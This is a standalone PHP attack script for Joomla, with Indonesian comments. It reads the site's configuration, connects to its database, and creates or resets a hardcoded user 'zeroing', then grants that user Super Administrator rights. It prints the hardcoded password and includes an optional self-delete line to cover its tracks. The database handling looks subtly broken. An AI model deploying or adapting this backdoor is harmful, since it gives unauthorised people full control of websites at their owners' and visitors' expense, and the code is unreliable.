<?php
// SCRIPT JOOMLA DENGAN HANDLING DUPLICATE (SOLUSI 1 - TERBAIK)
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);

// Konfigurasi
$username = 'zeroing';
$password = 'Kakekterbang07#';
$email = 'askurmom007@proton.me';
$name = 'Staff';

// Load configuration.php
$config_path = $_SERVER['DOCUMENT_ROOT'] . '/configuration.php';
if (!file_exists($config_path)) {
    die('Configuration file not found');
}

include_once($config_path);

// Koneksi database
$conn = @mysqli_connect($host, $user, $password, $db);
if (!$conn) {
    die('Database connection failed');
}

// ===== HANDLE DUPLICATE =====
// Cek user
$checkUser = "SELECT id FROM {$dbprefix}users WHERE username = '$username'";
$resultUser = @mysqli_query($conn, $checkUser);

if (mysqli_num_rows($resultUser) > 0) {
    // User sudah ada → Update password & jadi admin
    $row = mysqli_fetch_assoc($resultUser);
    $userId = $row['id'];
    
    // Update password
    $hashed_password = md5($password);
    $updatePass = "UPDATE {$dbprefix}users SET password = '$hashed_password' WHERE id = $userId";
    @mysqli_query($conn, $updatePass);
    
    // Pastikan jadi admin
    $checkGroup = "SELECT * FROM {$dbprefix}user_usergroup_map WHERE user_id = $userId AND group_id = 8";
    if (mysqli_num_rows(@mysqli_query($conn, $checkGroup)) == 0) {
        $insertGroup = "INSERT INTO {$dbprefix}user_usergroup_map (user_id, group_id) VALUES ($userId, 8)";
        @mysqli_query($conn, $insertGroup);
    }
    
    echo "✅ User sudah ada! Password diupdate.<br>";
    echo "Username: $username<br>";
    echo "Password: $password<br>";
    echo "Status: Super Administrator<br>";
    
} else {
    // User belum ada → Buat baru
    $hashed_password = md5($password);
    $insertUser = "INSERT INTO {$dbprefix}users 
                   (name, username, email, password, block, registerDate, params) 
                   VALUES ('$name', '$username', '$email', '$hashed_password', 0, NOW(), '')";
    
    if (@mysqli_query($conn, $insertUser)) {
        $userId = mysqli_insert_id($conn);
        
        $insertGroup = "INSERT INTO {$dbprefix}user_usergroup_map (user_id, group_id) 
                        VALUES ($userId, 8)";
        @mysqli_query($conn, $insertGroup);
        
        echo "✅ User baru berhasil dibuat!<br>";
        echo "Username: $username<br>";
        echo "Password: $password<br>";
        echo "Status: Super Administrator<br>";
    } else {
        echo "❌ Gagal membuat user: " . mysqli_error($conn);
    }
}

mysqli_close($conn);

// Hapus script setelah selesai? (Optional)
// unlink(__FILE__);
?>
